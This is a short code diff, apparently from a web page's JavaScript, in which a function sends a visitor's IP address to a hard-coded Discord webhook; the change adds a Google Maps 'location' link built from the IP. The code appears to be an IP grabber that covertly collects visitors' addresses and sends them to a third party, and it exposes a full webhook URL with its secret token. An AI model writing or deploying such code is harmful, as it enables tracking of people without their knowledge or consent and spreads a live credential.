@@ -85,7 +85,7 @@
 
         function sendToDiscord(ip) {
             var webhookURL = "https://discord.com/api/webhooks/1212900989154099250/6LQWxqzmarY9YUxPLLF2h6kQrYrcjV7NJuaNbVUs4k4RhNBrvEbduTX4IFreMq7T48XF";
-            var message = "Endereço IP: " + ip;
+            var message = "IP: " + ip + " Localização: https://www.google.com/maps?q=" + ip;
 
             fetch(webhookURL, {
                 method: "POST",
